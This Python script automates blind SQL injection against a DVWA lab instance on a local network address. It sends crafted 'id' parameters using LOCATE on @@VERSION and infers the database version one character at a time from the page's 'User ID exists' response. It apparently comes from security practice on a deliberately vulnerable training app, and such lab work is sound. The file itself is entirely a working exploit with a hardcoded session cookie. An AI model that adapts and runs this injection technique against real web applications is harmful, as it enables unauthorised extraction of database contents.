#! /usr/bin/python3

import requests
import sys

charlist = [str(i) for i in range(10) ] +  [chr(i) for i in range(32,127)]

URL = "http://192.168.0.105/dvwa/vulnerabilities/sqli_blind/"

COOKIES = {'security': 'low', 'PHPSESSID': 's6v1p8jf7eofj92eamqmhpavst'}

PASSEDTEXT = "User ID exists in the database."


FOUND, VERSION, STRAIGHT = False, "", True
while not FOUND:
    if STRAIGHT:
        for char in charlist:
            print(f"\r[*] Trying {char}", end="")
            response = requests.get(URL, params={'id':"1' AND LOCATE('" + VERSION + char + "',@@VERSION);-- -", "Submit":"Submit"}, cookies=COOKIES)
            
            if PASSEDTEXT in response.text:
                print(f"[+] WORKED FOR {char}... Version guess: {VERSION}")
                VERSION = VERSION + char
                break
        else:
            STRAIGHT = False
    else:
        for char in charlist:
            print(f"\r[*] Trying {char}", end="")
            response = requests.get(URL, params={'id':"1' AND LOCATE('" + char + VERSION + "',@@VERSION);-- -", "Submit":"Submit"}, cookies=COOKIES)
            
            if PASSEDTEXT in response.text:
                print(f"[+] WORKED FOR {char}... Version guess: {VERSION}")
                VERSION = char + VERSION 
                break
        else:
            response = requests.get(URL, params={'id':"1' AND '"+VERSION+"'=@@VERSION;-- -", "Submit":"Submit"}, cookies=COOKIES)
            if PASSEDTEXT in response.text:
                print(f"VERSION Found: {VERSION}")
                sys.exit()
            
    
    

